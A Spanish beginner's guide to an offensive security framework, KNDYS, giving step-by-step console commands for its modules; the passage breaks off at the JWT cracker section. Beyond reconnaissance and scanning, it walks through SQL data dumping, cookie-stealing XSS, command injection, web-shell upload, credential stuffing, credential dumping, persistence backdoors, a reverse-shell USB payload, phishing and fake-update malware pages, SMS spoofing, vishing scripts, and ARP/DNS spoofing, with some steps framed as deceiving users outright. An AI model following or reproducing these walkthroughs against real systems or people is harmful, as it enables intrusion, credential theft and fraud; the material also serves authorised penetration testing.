# 📚 Guía Completa de Módulos KNDYS - Paso a Paso

> **Guía para principiantes**: Explicaciones sencillas sin tecnicismos para usar cada módulo del framework.

---

## 📋 Índice

- [🔍 Módulos de Reconocimiento](#-módulos-de-reconocimiento)
- [🛡️ Módulos de Escaneo](#️-módulos-de-escaneo)
- [💥 Módulos de Explotación](#-módulos-de-explotación)
- [🔐 Módulos de Contraseñas](#-módulos-de-contraseñas)
- [📡 Módulos Post-Explotación](#-módulos-post-explotación)
- [📶 Módulos Inalámbricos](#-módulos-inalámbricos)
- [👥 Módulos de Ingeniería Social](#-módulos-de-ingeniería-social)
- [🌐 Módulos de Red](#-módulos-de-red)
- [🌍 Módulos Web Avanzados](#-módulos-web-avanzados)

---

## 🔍 Módulos de Reconocimiento

Estos módulos te ayudan a recopilar información sobre un objetivo (sitio web, servidor, red) sin atacarlo directamente.

### 1. 🔌 Port Scanner (Escáner de Puertos)

**¿Qué hace?**  
Busca "puertas" abiertas en un servidor. Cada puerta es un puerto que permite conexiones.

**¿Cuándo usarlo?**  
Cuando quieres saber qué servicios están disponibles en un servidor (web, email, SSH, etc.).

**Paso a paso:**

```bash
# 1. Inicia KNDYS
./kndys.py

# 2. Carga el módulo
kndys> use reconnaissance/port_scanner

# 3. Establece el objetivo (ejemplo: scanme.nmap.org es un servidor de prueba legal)
kndys(reconnaissance/port_scanner)> set target scanme.nmap.org

# 4. Define qué puertos revisar (1-1000 revisa los primeros 1000)
kndys(reconnaissance/port_scanner)> set ports 1-1000

# 5. Ejecuta el escaneo
kndys(reconnaissance/port_scanner)> run
```

**¿Qué verás?**  
Una lista de puertos abiertos con el servicio que corre en cada uno:
- Puerto 22: SSH (acceso remoto seguro)
- Puerto 80: HTTP (sitio web)
- Puerto 443: HTTPS (sitio web seguro)

---

### 2. 🌐 Subdomain Scanner (Buscador de Subdominios)

**¿Qué hace?**  
Encuentra todas las "subsecciones" de un sitio web. Por ejemplo, si el sitio es `example.com`, puede encontrar `mail.example.com`, `blog.example.com`, etc.

**¿Cuándo usarlo?**  
Para descubrir todas las partes de una organización en internet (a veces hay partes olvidadas o menos seguras).

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use reconnaissance/subdomain_scanner

# 2. Establece el dominio objetivo
kndys(reconnaissance/subdomain_scanner)> set target example.com

# 3. Opcional: usa un diccionario personalizado (lista de subdominios comunes)
kndys(reconnaissance/subdomain_scanner)> set wordlist subdomain-list.txt

# 4. Ejecuta
kndys(reconnaissance/subdomain_scanner)> run
```

**¿Qué verás?**  
Una lista de subdominios encontrados:
- `www.example.com`
- `mail.example.com`
- `ftp.example.com`
- `admin.example.com`

---

### 3. 🕷️ Web Crawler (Rastreador Web)

**¿Qué hace?**  
Navega automáticamente por todas las páginas de un sitio web, como una araña tejiendo su red.

**¿Cuándo usarlo?**  
Para mapear toda la estructura de un sitio web y encontrar páginas ocultas o recursos interesantes.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use reconnaissance/web_crawler

# 2. Establece la URL inicial
kndys(reconnaissance/web_crawler)> set target https://example.com

# 3. Define cuántas páginas máximo quieres visitar
kndys(reconnaissance/web_crawler)> set max_pages 100

# 4. Define la profundidad (niveles de enlaces a seguir)
kndys(reconnaissance/web_crawler)> set depth 3

# 5. Ejecuta
kndys(reconnaissance/web_crawler)> run
```

**¿Qué verás?**  
Un mapa completo del sitio:
- Todas las URLs encontradas
- Formularios detectados
- Archivos descargables
- Enlaces externos

---

### 4. 🗺️ Network Mapper (Mapeador de Red)

**¿Qué hace?**  
Crea un "mapa" de todos los dispositivos conectados a una red (computadoras, impresoras, routers, etc.).

**¿Cuándo usarlo?**  
En pruebas de red interna para ver todos los dispositivos conectados.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use reconnaissance/network_mapper

# 2. Establece el rango de red (ejemplo: red local típica)
kndys(reconnaissance/network_mapper)> set target 192.168.1.0/24

# 3. Ejecuta
kndys(reconnaissance/network_mapper)> run
```

**¿Qué verás?**  
Lista de dispositivos:
- IP: 192.168.1.1 - Router
- IP: 192.168.1.10 - Computadora
- IP: 192.168.1.20 - Impresora
- IP: 192.168.1.30 - Teléfono

---

### 5. 💻 OS Detection (Detector de Sistema Operativo)

**¿Qué hace?**  
Adivina qué sistema operativo usa un servidor (Windows, Linux, etc.).

**¿Cuándo usarlo?**  
Para saber con qué tipo de sistema estás trabajando antes de hacer pruebas específicas.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use reconnaissance/os_detection

# 2. Establece el objetivo
kndys(reconnaissance/os_detection)> set target example.com

# 3. Ejecuta
kndys(reconnaissance/os_detection)> run
```

**¿Qué verás?**  
Información del sistema:
- Sistema: Linux Ubuntu 20.04
- Servidor Web: Apache 2.4
- Probabilidad: 95%

---

## 🛡️ Módulos de Escaneo

Estos módulos buscan vulnerabilidades (puntos débiles) en sistemas y aplicaciones web.

### 6. 🔍 Vulnerability Scanner (Escáner de Vulnerabilidades)

**¿Qué hace?**  
Realiza más de 30 pruebas diferentes para encontrar problemas de seguridad comunes en un sitio web.

**¿Cuándo usarlo?**  
Para un análisis completo y rápido de la seguridad de una aplicación web.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use scanner/vuln_scanner

# 2. Establece la URL objetivo
kndys(scanner/vuln_scanner)> set target https://example.com

# 3. Ejecuta
kndys(scanner/vuln_scanner)> run
```

**¿Qué verás?**  
Un reporte completo con:
- Vulnerabilidades encontradas (críticas, altas, medias, bajas)
- Descripción de cada problema
- Cómo explotarlas (si es posible)
- Recomendaciones para solucionarlas

---

### 7. 💉 SQL Scanner (Escáner de Inyección SQL)

**¿Qué hace?**  
Busca un tipo específico de vulnerabilidad donde un atacante puede manipular la base de datos del sitio web.

**¿Cuándo usarlo?**  
Cuando un sitio tiene formularios o URLs con parámetros (como `?id=1`).

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use scanner/sql_injection

# 2. Establece la URL vulnerable (ejemplo de prueba)
kndys(scanner/sql_injection)> set target http://testphp.vulnweb.com/artists.php?artist=1

# 3. Define el método (GET o POST)
kndys(scanner/sql_injection)> set method GET

# 4. Ejecuta
kndys(scanner/sql_injection)> run
```

**¿Qué verás?**  
- Si el sitio es vulnerable a SQL injection
- Tipo de vulnerabilidad (error-based, blind, time-based)
- Ejemplos de payloads que funcionan

---

### 8. 🚨 XSS Scanner (Escáner de Cross-Site Scripting)

**¿Qué hace?**  
Busca lugares donde un atacante puede inyectar código malicioso (JavaScript) en un sitio web.

**¿Cuándo usarlo?**  
En sitios con campos de búsqueda, comentarios, o cualquier lugar donde los usuarios ingresan texto.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use scanner/xss

# 2. Establece la URL con el campo vulnerable
kndys(scanner/xss)> set target http://example.com/search

# 3. Especifica el nombre del parámetro (campo de búsqueda)
kndys(scanner/xss)> set param q

# 4. Ejecuta
kndys(scanner/xss)> run
```

**¿Qué verás?**  
- Si el sitio es vulnerable a XSS
- Tipo de XSS (reflejado, almacenado, DOM)
- Payloads de prueba que funcionan

---

### 9. 🔐 SSL Scanner (Escáner SSL/TLS)

**¿Qué hace?**  
Verifica si un sitio web tiene configurado correctamente su certificado de seguridad (HTTPS).

**¿Cuándo usarlo?**  
Para verificar la seguridad de la conexión cifrada de un sitio web.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use scanner/ssl_scanner

# 2. Establece el objetivo
kndys(scanner/ssl_scanner)> set target example.com

# 3. Establece el puerto (443 es el puerto HTTPS estándar)
kndys(scanner/ssl_scanner)> set port 443

# 4. Ejecuta
kndys(scanner/ssl_scanner)> run
```

**¿Qué verás?**  
- Versión de SSL/TLS
- Certificado válido o no
- Cifrados soportados
- Vulnerabilidades conocidas (Heartbleed, POODLE, etc.)

---

### 10. 📁 Directory Traversal (Explorador de Directorios)

**¿Qué hace?**  
Busca vulnerabilidades que permiten acceder a archivos que deberían estar protegidos en el servidor.

**¿Cuándo usarlo?**  
Cuando sospechas que un sitio permite acceso no autorizado a archivos del sistema.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use scanner/dir_traversal

# 2. Establece la URL base
kndys(scanner/dir_traversal)> set target http://example.com/files

# 3. Ejecuta
kndys(scanner/dir_traversal)> run
```

**¿Qué verás?**  
- Archivos sensibles accesibles (/etc/passwd, configuraciones, etc.)
- Rutas vulnerables encontradas

---

### 11. 🛡️ CSRF Scanner (Escáner de Falsificación de Peticiones)

**¿Qué hace?**  
Busca formularios web que no tienen protección contra ataques donde un atacante puede hacer que tu navegador envíe peticiones sin que te des cuenta.

**¿Cuándo usarlo?**  
En sitios con formularios importantes (cambio de contraseña, transferencias, etc.).

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use scanner/csrf

# 2. Establece la URL del sitio
kndys(scanner/csrf)> set url https://example.com

# 3. Ejecuta
kndys(scanner/csrf)> run
```

**¿Qué verás?**  
- Formularios sin protección CSRF
- Tokens de seguridad ausentes o débiles
- Vulnerabilidades por severidad

---

## 💥 Módulos de Explotación

**⚠️ ADVERTENCIA**: Estos módulos realizan ataques reales. SOLO úsalos en sistemas que tienes permiso de probar.

### 12. 💉 SQL Injection (Explotación de SQL)

**¿Qué hace?**  
Explota activamente una vulnerabilidad SQL para extraer datos de la base de datos.

**¿Cuándo usarlo?**  
Después de confirmar una vulnerabilidad SQL con el escáner.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use exploit/sql_injection

# 2. Establece la URL vulnerable
kndys(exploit/sql_injection)> set target http://testphp.vulnweb.com/artists.php?artist=1

# 3. Define qué quieres extraer
kndys(exploit/sql_injection)> set action dump_tables

# 4. Ejecuta
kndys(exploit/sql_injection)> run
```

**¿Qué verás?**  
- Nombres de bases de datos
- Tablas disponibles
- Datos extraídos (usuarios, contraseñas, etc.)

---

### 13. 🚨 XSS Exploit (Explotación de XSS)

**¿Qué hace?**  
Ejecuta código JavaScript en el navegador de las víctimas a través de una vulnerabilidad XSS.

**¿Cuándo usarlo?**  
Para demostrar el impacto real de una vulnerabilidad XSS.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use exploit/xss_exploit

# 2. Establece la URL vulnerable
kndys(exploit/xss_exploit)> set target http://example.com/search?q=

# 3. Elige el tipo de payload
kndys(exploit/xss_exploit)> set payload cookie_stealer

# 4. Ejecuta
kndys(exploit/xss_exploit)> run
```

**¿Qué verás?**  
- Payload generado
- URL maliciosa lista para usar
- Servidor listo para capturar cookies

---

### 14. ⚡ Command Injection (Inyección de Comandos)

**¿Qué hace?**  
Ejecuta comandos del sistema operativo en el servidor a través de una vulnerabilidad.

**¿Cuándo usarlo?**  
Cuando un sitio procesa entrada de usuario sin validar correctamente.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use exploit/command_injection

# 2. Establece la URL
kndys(exploit/command_injection)> set target http://example.com/ping.php

# 3. Especifica el parámetro vulnerable
kndys(exploit/command_injection)> set param ip

# 4. Define el comando a ejecutar
kndys(exploit/command_injection)> set command whoami

# 5. Ejecuta
kndys(exploit/command_injection)> run
```

**¿Qué verás?**  
- Resultado del comando ejecutado en el servidor
- Acceso al sistema comprometido

---

### 15. 📤 File Upload (Explotación de Subida de Archivos)

**¿Qué hace?**  
Sube un archivo malicioso al servidor explotando una función de carga de archivos mal configurada.

**¿Cuándo usarlo?**  
En sitios que permiten subir imágenes, documentos, etc.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use exploit/file_upload

# 2. Establece la URL del formulario de carga
kndys(exploit/file_upload)> set target http://example.com/upload.php

# 3. Elige el tipo de payload
kndys(exploit/file_upload)> set payload php_shell

# 4. Ejecuta
kndys(exploit/file_upload)> run
```

**¿Qué verás?**  
- Archivo subido exitosamente
- URL de acceso al shell web
- Control remoto del servidor

---

## 🔐 Módulos de Contraseñas

Estos módulos ayudan a probar la fortaleza de contraseñas y sistemas de autenticación.

### 16. 🔨 Brute Force (Fuerza Bruta)

**¿Qué hace?**  
Prueba automáticamente miles de combinaciones de usuario/contraseña hasta encontrar la correcta.

**¿Cuándo usarlo?**  
Para probar la seguridad de un formulario de login.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use password/brute_force

# 2. Establece la URL del login
kndys(password/brute_force)> set target http://example.com/login

# 3. Define el usuario
kndys(password/brute_force)> set username admin

# 4. Especifica el diccionario de contraseñas
kndys(password/brute_force)> set wordlist passwords.txt

# 5. Ejecuta
kndys(password/brute_force)> run
```

**¿Qué verás?**  
- Contraseñas probadas en tiempo real
- Contraseña correcta cuando se encuentra
- Tiempo total del ataque

---

### 17. #️⃣ Hash Cracker (Descifrador de Hashes)

**¿Qué hace?**  
Descifra contraseñas que están en formato "hash" (encriptadas).

**¿Cuándo usarlo?**  
Cuando obtienes hashes de contraseñas y necesitas conocer el texto original.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use password/hash_cracker

# 2. Ingresa el hash a descifrar
kndys(password/hash_cracker)> set hash 5f4dcc3b5aa765d61d8327deb882cf99

# 3. Especifica el tipo de hash
kndys(password/hash_cracker)> set hash_type md5

# 4. Opcional: usa un diccionario
kndys(password/hash_cracker)> set wordlist rockyou.txt

# 5. Ejecuta
kndys(password/hash_cracker)> run
```

**¿Qué verás?**  
- Hash: 5f4dcc3b5aa765d61d8327deb882cf99
- Contraseña: password
- Tiempo: 2.3 segundos

---

### 18. 💦 Password Spray (Rociado de Contraseñas)

**¿Qué hace?**  
Prueba una o pocas contraseñas comunes contra muchos usuarios (lo contrario de brute force).

**¿Cuándo usarlo?**  
Para evitar bloqueos de cuenta al probar muchos usuarios con pocas contraseñas.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use password/spray_attack

# 2. Establece el objetivo
kndys(password/spray_attack)> set target http://example.com/login

# 3. Define la lista de usuarios
kndys(password/spray_attack)> set userlist users.txt

# 4. Define contraseñas comunes
kndys(password/spray_attack)> set passwords Password123,Welcome2024

# 5. Ejecuta
kndys(password/spray_attack)> run
```

**¿Qué verás?**  
- Usuarios probados
- Credenciales válidas encontradas
- Cuentas vulnerables

---

### 19. 🎯 Credential Stuffing (Relleno de Credenciales)

**¿Qué hace?**  
Prueba pares de usuario/contraseña filtrados de otras brechas de datos.

**¿Cuándo usarlo?**  
Para verificar si usuarios reutilizan contraseñas comprometidas.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use password/credential_stuffing

# 2. Establece el sitio objetivo
kndys(password/credential_stuffing)> set target http://example.com/login

# 3. Proporciona archivo de credenciales (formato: usuario:contraseña)
kndys(password/credential_stuffing)> set credentials leaked-creds.txt

# 4. Ejecuta
kndys(password/credential_stuffing)> run
```

**¿Qué verás?**  
- Credenciales probadas
- Logins exitosos
- Usuarios con credenciales reutilizadas

---

## 📡 Módulos Post-Explotación

Estos módulos se usan DESPUÉS de comprometer un sistema.

### 20. 💻 Shell (Consola Remota)

**¿Qué hace?**  
Proporciona una consola de comandos en el sistema comprometido.

**¿Cuándo usarlo?**  
Después de explotar exitosamente un sistema.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use post/shell

# 2. El shell se conecta automáticamente si hay una sesión activa
kndys(post/shell)> run

# 3. Ya dentro del shell, ejecuta comandos
shell> whoami
shell> pwd
shell> ls -la
```

**¿Qué verás?**  
Una consola interactiva en el sistema remoto donde puedes ejecutar comandos.

---

### 21. 📂 File Explorer (Explorador de Archivos)

**¿Qué hace?**  
Navega por los archivos del sistema comprometido.

**¿Cuándo usarlo?**  
Para buscar archivos sensibles, documentos, contraseñas, etc.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use post/file_explorer

# 2. Define la ruta inicial
kndys(post/file_explorer)> set path /home

# 3. Ejecuta
kndys(post/file_explorer)> run
```

**¿Qué verás?**  
- Estructura de directorios
- Archivos interesantes encontrados
- Permisos de archivos

---

### 22. 🔓 Privilege Escalation (Escalada de Privilegios)

**¿Qué hace?**  
Intenta obtener permisos de administrador en un sistema ya comprometido.

**¿Cuándo usarlo?**  
Cuando tienes acceso limitado y necesitas permisos de root/administrador.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use post/privilege_escalation

# 2. Elige el sistema operativo
kndys(post/privilege_escalation)> set os linux

# 3. Ejecuta
kndys(post/privilege_escalation)> run
```

**¿Qué verás?**  
- Vectores de escalada disponibles
- Exploits aplicables
- Resultado del intento de escalada

---

### 23. 🔑 Credential Dumper (Extractor de Credenciales)

**¿Qué hace?**  
Busca y extrae contraseñas almacenadas en el sistema comprometido.

**¿Cuándo usarlo?**  
Para obtener credenciales de otros usuarios o servicios.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use post/credential_dumper

# 2. Define qué buscar
kndys(post/credential_dumper)> set profile comprehensive

# 3. Ejecuta
kndys(post/credential_dumper)> run
```

**¿Qué verás?**  
- Contraseñas de navegadores
- Claves SSH
- Tokens de autenticación
- Credenciales de bases de datos

---

### 24. 🔄 Persistence (Persistencia)

**¿Qué hace?**  
Crea una "puerta trasera" para mantener acceso al sistema incluso después de reinicios.

**¿Cuándo usarlo?**  
En pruebas de penetración autorizadas para mantener acceso de largo plazo.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use post/persistence

# 2. Elige el método
kndys(post/persistence)> set method cronjob

# 3. Ejecuta
kndys(post/persistence)> run
```

**¿Qué verás?**  
- Mecanismo de persistencia instalado
- Instrucciones de reconexión
- Backdoor activo

---

### 25. 🌐 Pivot (Pivoteo de Red)

**¿Qué hace?**  
Usa un sistema comprometido como "puente" para acceder a otros sistemas en redes internas.

**¿Cuándo usarlo?**  
Para moverse lateralmente en una red corporativa.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use post/pivot

# 2. Define la red objetivo
kndys(post/pivot)> set network 10.0.0.0/24

# 3. Ejecuta
kndys(post/pivot)> run
```

**¿Qué verás?**  
- Ruta de pivote establecida
- Sistemas accesibles a través del pivot
- Nueva red mapeada

---

## 📶 Módulos Inalámbricos

Estos módulos trabajan con redes WiFi.

### 26. 📡 WiFi Scanner (Escáner WiFi)

**¿Qué hace?**  
Busca todas las redes WiFi cercanas y recopila información sobre ellas.

**¿Cuándo usarlo?**  
Para evaluar la seguridad de redes inalámbricas en un área.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use wireless/wifi_scanner

# 2. Especifica la interfaz de red (ejemplo: wlan0)
kndys(wireless/wifi_scanner)> set interface wlan0

# 3. Ejecuta
kndys(wireless/wifi_scanner)> run
```

**¿Qué verás?**  
- SSID (nombre de la red)
- BSSID (dirección MAC del router)
- Canal
- Tipo de cifrado (WPA2, WEP, etc.)
- Potencia de señal

---

### 27. 🔓 WiFi Cracker (Descifrador WiFi)

**¿Qué hace?**  
Intenta descifrar la contraseña de una red WiFi.

**¿Cuándo usarlo?**  
Para probar la fortaleza de tu propia red WiFi.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use wireless/wifi_cracker

# 2. Establece el SSID de la red objetivo
kndys(wireless/wifi_cracker)> set target MyWiFiNetwork

# 3. Proporciona un diccionario
kndys(wireless/wifi_cracker)> set wordlist wifi-passwords.txt

# 4. Ejecuta
kndys(wireless/wifi_cracker)> run
```

**¿Qué verás?**  
- Captura de handshake
- Progreso del cracking
- Contraseña si se encuentra

---

### 28. 🎭 Rogue AP (Punto de Acceso Falso)

**¿Qué hace?**  
Crea un punto de acceso WiFi falso para interceptar tráfico.

**¿Cuándo usarlo?**  
Para demostrar ataques de "Evil Twin" en evaluaciones de seguridad física.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use wireless/rogue_ap

# 2. Define el nombre de la red falsa
kndys(wireless/rogue_ap)> set ssid FreeWiFi

# 3. Establece la interfaz
kndys(wireless/rogue_ap)> set interface wlan0

# 4. Ejecuta
kndys(wireless/rogue_ap)> run
```

**¿Qué verás?**  
- Punto de acceso activo
- Clientes conectados
- Tráfico interceptado

---

## 👥 Módulos de Ingeniería Social

Estos módulos simulan ataques que explotan el comportamiento humano.

### 29. 🎣 Phishing (Suplantación de Identidad)

**¿Qué hace?**  
Crea un sitio web falso que imita uno legítimo para robar credenciales.

**¿Cuándo usarlo?**  
En campañas de concienciación de seguridad para empleados.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use social/phishing

# 2. Elige la plantilla (Gmail, Facebook, etc.)
kndys(social/phishing)> set template gmail

# 3. Define el puerto del servidor
kndys(social/phishing)> set port 8080

# 4. Ejecuta
kndys(social/phishing)> run
```

**¿Qué verás?**  
- Servidor web iniciado
- URL del sitio falso
- Credenciales capturadas cuando alguien intenta loguearse

---

### 30. 🕸️ Credential Harvester (Cosechador de Credenciales)

**¿Qué hace?**  
Similar al phishing pero más automatizado y con múltiples plantillas.

**¿Cuándo usarlo?**  
Para recolectar credenciales en pruebas de ingeniería social.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use social/credential_harvester

# 2. Elige el servicio a clonar
kndys(social/credential_harvester)> set service linkedin

# 3. Ejecuta
kndys(social/credential_harvester)> run
```

**¿Qué verás?**  
- Página de login falsa activa
- Credenciales recolectadas en tiempo real
- Redirección automática al sitio real

---

### 31. 🌐 Website Cloner (Clonador de Sitios Web)

**¿Qué hace?**  
Crea una copia exacta de cualquier sitio web.

**¿Cuándo usarlo?**  
Para crear réplicas convincentes en ataques de phishing.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use social/website_cloner

# 2. Establece el sitio a clonar
kndys(social/website_cloner)> set target https://example.com

# 3. Define dónde guardar la copia
kndys(social/website_cloner)> set output cloned_site

# 4. Ejecuta
kndys(social/website_cloner)> run
```

**¿Qué verás?**  
- Copia del sitio descargada
- Archivos HTML, CSS, JavaScript guardados
- Sitio listo para hostear

---

### 32. 📧 Mass Mailer (Envío Masivo de Emails)

**¿Qué hace?**  
Envía correos electrónicos a múltiples objetivos en campañas de phishing.

**¿Cuándo usarlo?**  
En simulaciones de ataques de phishing a gran escala.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use social/mass_mailer

# 2. Elige la plantilla de email
kndys(social/mass_mailer)> set template invoice

# 3. Proporciona lista de objetivos (archivo CSV)
kndys(social/mass_mailer)> set targets targets.csv

# 4. Configura servidor SMTP
kndys(social/mass_mailer)> set smtp_server smtp.gmail.com

# 5. Ejecuta
kndys(social/mass_mailer)> run
```

**¿Qué verás?**  
- Emails enviándose
- Tasas de entrega
- Clics en enlaces (si se rastrea)

---

### 33. 📱 QR Generator (Generador de Códigos QR)

**¿Qué hace?**  
Crea códigos QR maliciosos que redirigen a sitios de phishing.

**¿Cuándo usarlo?**  
Para pruebas de seguridad física (dejar QR en lugares públicos).

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use social/qr_generator

# 2. Define la URL maliciosa
kndys(social/qr_generator)> set url http://malicious-site.com

# 3. Establece el tamaño
kndys(social/qr_generator)> set size 300

# 4. Define archivo de salida
kndys(social/qr_generator)> set output qr_code.png

# 5. Ejecuta
kndys(social/qr_generator)> run
```

**¿Qué verás?**  
- Código QR generado
- Imagen guardada
- Lista para imprimir

---

### 34. 💾 USB Payload (Payload para USB)

**¿Qué hace?**  
Genera payloads para dispositivos USB maliciosos (BadUSB, Rubber Ducky).

**¿Cuándo usarlo?**  
Para crear ataques de "USB drop" en pruebas de seguridad física.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use social/usb_payload

# 2. Elige el tipo de payload
kndys(social/usb_payload)> set payload_type reverse_shell

# 3. Define el sistema operativo objetivo
kndys(social/usb_payload)> set target_os windows

# 4. Configura tu IP y puerto
kndys(social/usb_payload)> set lhost 192.168.1.100
kndys(social/usb_payload)> set lport 4444

# 5. Ejecuta
kndys(social/usb_payload)> run
```

**¿Qué verás?**  
- Script de Rubber Ducky generado
- Instrucciones de carga en el dispositivo
- Payload listo

---

### 35. 🔄 Fake Update (Actualización Falsa)

**¿Qué hace?**  
Crea una página web que simula una actualización de software (Chrome, Flash, etc.).

**¿Cuándo usarlo?**  
Para engañar a usuarios para que descarguen malware.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use social/fake_update

# 2. Elige el software a simular
kndys(social/fake_update)> set software chrome

# 3. Establece el payload (archivo malicioso)
kndys(social/fake_update)> set payload malware.exe

# 4. Define el puerto
kndys(social/fake_update)> set port 8080

# 5. Ejecuta
kndys(social/fake_update)> run
```

**¿Qué verás?**  
- Página de actualización falsa generada
- Servidor web activo
- Descargas registradas

---

### 36. 📱 SMS Spoofing (Suplantación de SMS)

**¿Qué hace?**  
Envía mensajes SMS con el remitente falsificado.

**¿Cuándo usarlo?**  
Para simular ataques de phishing por SMS (smishing).

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use social/sms_spoofing

# 2. Define el nombre del remitente (falsificado)
kndys(social/sms_spoofing)> set sender DHL

# 3. Escribe el mensaje
kndys(social/sms_spoofing)> set message "Your package is ready. Track: http://fake-link.com"

# 4. Proporciona lista de números
kndys(social/sms_spoofing)> set targets phones.txt

# 5. Configura Twilio (API de SMS)
kndys(social/sms_spoofing)> set twilio_sid YOUR_SID
kndys(social/sms_spoofing)> set twilio_token YOUR_TOKEN

# 6. Ejecuta
kndys(social/sms_spoofing)> run
```

**¿Qué verás?**  
- SMS enviándose
- Estado de entrega
- Resumen de campaña

---

### 37. 🎭 Pretexting (Escenarios de Engaño)

**¿Qué hace?**  
Genera escenarios y guiones para llamadas de ingeniería social.

**¿Cuándo usarlo?**  
Para preparar ataques de vishing (phishing telefónico).

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use social/pretexting

# 2. Elige el escenario
kndys(social/pretexting)> set scenario it_support

# 3. Define la empresa objetivo
kndys(social/pretexting)> set company TechCorp

# 4. Establece nivel de urgencia
kndys(social/pretexting)> set urgency high

# 5. Ejecuta
kndys(social/pretexting)> run
```

**¿Qué verás?**  
- Guión completo de la llamada
- Frases clave
- Respuestas a objeciones comunes
- Técnicas de presión

---

## 🌐 Módulos de Red

Estos módulos realizan ataques a nivel de red.

### 38. 🔀 ARP Spoof (Envenenamiento ARP)

**¿Qué hace?**  
Intercepta tráfico de red haciéndose pasar por otro dispositivo.

**¿Cuándo usarlo?**  
Para realizar ataques Man-in-the-Middle en redes locales.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use network/arp_spoof

# 2. Define el objetivo (víctima)
kndys(network/arp_spoof)> set target 192.168.1.100

# 3. Define el gateway (router)
kndys(network/arp_spoof)> set gateway 192.168.1.1

# 4. Especifica la interfaz
kndys(network/arp_spoof)> set interface eth0

# 5. Ejecuta
kndys(network/arp_spoof)> run
```

**¿Qué verás?**  
- Paquetes ARP enviándose
- Tráfico siendo interceptado
- Datos capturados en tiempo real

---

### 39. 🌐 DNS Spoof (Envenenamiento DNS)

**¿Qué hace?**  
Redirige peticiones de sitios web a direcciones IP falsas.

**¿Cuándo usarlo?**  
Para redirigir usuarios a sitios de phishing de forma transparente.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use network/dns_spoof

# 2. Define el dominio a secuestrar
kndys(network/dns_spoof)> set target facebook.com

# 3. Establece la IP falsa
kndys(network/dns_spoof)> set redirect 192.168.1.50

# 4. Ejecuta
kndys(network/dns_spoof)> run
```

**¿Qué verás?**  
- Servidor DNS falso activo
- Peticiones DNS interceptadas
- Redirecciones exitosas

---

### 40. 🔋 DHCP Starvation (Agotamiento DHCP)

**¿Qué hace?**  
Consume todas las direcciones IP disponibles en una red, causando denegación de servicio.

**¿Cuándo usarlo?**  
Para probar la resistencia de servidores DHCP.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use network/dhcp_starvation

# 2. Especifica la interfaz
kndys(network/dhcp_starvation)> set interface eth0

# 3. Ejecuta
kndys(network/dhcp_starvation)> run
```

**¿Qué verás?**  
- Solicitudes DHCP masivas
- IPs asignadas
- Servidor DHCP agotado

---

### 41. 🔓 SSL Strip (Degradación SSL)

**¿Qué hace?**  
Convierte conexiones HTTPS seguras en HTTP inseguras para interceptar datos.

**¿Cuándo usarlo?**  
Para demostrar riesgos de navegación sin verificar certificados.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use network/ssl_strip

# 2. Define la interfaz
kndys(network/ssl_strip)> set interface eth0

# 3. Ejecuta
kndys(network/ssl_strip)> run
```

**¿Qué verás?**  
- Conexiones HTTPS degradadas a HTTP
- Datos en texto plano capturados
- Cookies y credenciales interceptadas

---

### 42. 📡 Packet Sniffer (Capturador de Paquetes)

**¿Qué hace?**  
Captura y analiza todo el tráfico de red que pasa por una interfaz.

**¿Cuándo usarlo?**  
Para analizar comunicaciones de red y encontrar información sensible.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use network/packet_sniffer

# 2. Define la interfaz
kndys(network/packet_sniffer)> set interface eth0

# 3. Opcional: filtra por protocolo
kndys(network/packet_sniffer)> set filter tcp port 80

# 4. Ejecuta
kndys(network/packet_sniffer)> run
```

**¿Qué verás?**  
- Paquetes capturados en tiempo real
- Origen y destino
- Contenido de los paquetes
- Contraseñas en texto plano (si existen)

---

## 🌍 Módulos Web Avanzados

Estos módulos se enfocan en tecnologías web modernas.

### 43. 🔐 JWT Cracker (Descifrador de Tokens JWT)

**¿Qué hace?**  
Descifra tokens JWT (JSON Web Tokens) usados para autenticación en APIs.

**¿Cuándo usarlo?**  
Cuando interceptas tokens JWT y quieres descifrar la clave secreta.

**Paso a paso:**

```bash
# 1. Carga el módulo
kndys> use web/jwt_cracker

# 2. Proporciona el token JWT
kndys(web/jwt_cracker)> set token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# 3. Opcional: proporciona diccionario
kndys(web/jwt_cracker)> set wordlist jwt-secrets.txt

# 4. Ejecuta
kndys(web/jwt_cracker)> run
```

**¿Qué verás?**  
